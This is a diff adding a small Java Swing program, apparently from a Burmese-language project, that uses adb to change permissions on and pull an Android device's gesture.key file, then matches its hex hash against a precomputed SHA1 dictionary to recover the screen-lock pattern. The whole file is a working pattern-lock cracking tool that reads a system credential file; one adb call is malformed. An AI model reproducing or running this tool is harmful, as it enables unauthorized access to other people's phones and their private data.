@@ -1,0 +1,133 @@
+/* ############# Following is Biberkolar Class ###############*/
+package com.biber.waifer;
+
+public class Biberkolar {
+	public static void main(String[] args) {
+		new BrighterGeneration();
+	}
+}
+
+/* ############# Following is BrighterGeneration Class ###############*/
+
+package com.biber.waifer;
+
+import java.awt.Color;
+import java.awt.Dimension;
+import java.awt.Font;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
+import java.util.ArrayList;
+
+import javax.swing.BorderFactory;
+import javax.swing.ImageIcon;
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.JTextField;
+import javax.swing.SwingConstants;
+
+public class BrighterGeneration extends JFrame {
+	private JPanel BrighterPanel;
+	private JButton BrighterButton;
+	private JTextField BrighterResult;
+	static BufferedReader br;
+	public BrighterGeneration() {
+		BrighterPanel = new JPanel();
+		BrighterButton = new JButton("ဒီကိုႏွီပ္ရင္");
+		BrighterButton.setPreferredSize(new Dimension(150,150));		
+		BrighterButton.setFont(new Font("Zawgyi-One",3,12));
+		BrighterResult = new JTextField("ဒီမွာအေျဖရမယ္",SwingConstants.CENTER);
+		BrighterResult.setBorder(BorderFactory.createLineBorder(Color.black));
+		BrighterResult.setPreferredSize(new Dimension(150,150));
+		BrighterResult.setFont(new Font("Zawgyi-One",3,12));
+		BrighterPanel.setBackground(Color.GRAY);
+		BrighterPanel.add(BrighterButton);
+		BrighterPanel.add(BrighterResult);	
+		BrighterButton.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				WaiferStartWorking();
+			}
+		});
+		add(BrighterPanel);
+		setVisible(true);
+		setSize(500, 200);
+		setResizable(false);
+		ImageIcon i = new ImageIcon(getClass().getResource("logo.gif"));
+		this.setIconImage(i.getImage());
+		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+		setLocationRelativeTo(null);
+	}
+	public void WaiferStartWorking(){
+		WaiferAdbChangePermission_GetGestureKey(new ProcessBuilder("E:\\adb\\adb", "pull","su -c 'chmod 666 /data/system/gesture.key'"));
+		WaiferAdbChangePermission_GetGestureKey(new ProcessBuilder("E:\\adb\\adb", "pull","/data/system/gesture.key","E:\\adb"));
+		WaiferDictionaryAttackr();
+	}
+	
+	private void WaiferDictionaryAttackr() {
+		String s =  WaiferDecoder();
+		  File f = new File("E:\\adb\\SHA1.txt");
+	    	StringBuilder stb = new StringBuilder();
+	    	StringBuilder st= new StringBuilder();
+	    	String line;
+	    	try {
+				br = new BufferedReader(new FileReader(f));
+				while((line = br.readLine())!= null){
+						st.append(line);
+						String ary[] = line.split(";");
+						if(ary[2].contentEquals(s)){
+							System.out.println(ary[0]);
+							BrighterResult.setText(ary[0]);
+							break;
+						}							
+				}
+			} catch (FileNotFoundException e) {
+				e.printStackTrace();
+			}	catch (IOException e) {
+				e.printStackTrace();
+			}
+	    }	
+
+	private String WaiferDecoder() {
+		FileInputStream fis = null;
+		  int cnt = 0;
+		 ArrayList<String>ar  = new ArrayList<String>();
+	    try {
+	        fis = new FileInputStream("E:\\adb\\gesture.key");
+	        int i = 0;	    
+	        while ((i = fis.read()) != -1) {
+	            if (i != -1) {	            
+	                cnt++;	   
+	                ar.add(String.format("%02X ", i));	               
+	            }
+	         }	       
+	        fis.close();
+	        } catch (FileNotFoundException e) {
+	        e.printStackTrace();
+	    } catch (IOException e) {
+			e.printStackTrace();
+		}	   
+	    String str = "";
+	    for(String s: ar){
+	       	 str += s;
+	        }
+	    System.out.println(str.replaceAll(" ",""));
+	   return (str.replaceAll(" ",""));
+	}
+	public void WaiferAdbChangePermission_GetGestureKey(ProcessBuilder BrighterProcess){
+		Process pc;
+		try {
+			pc = BrighterProcess.start();
+			pc.waitFor();
+		} catch (IOException e) {
+			e.printStackTrace();
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}		
+	}
+}
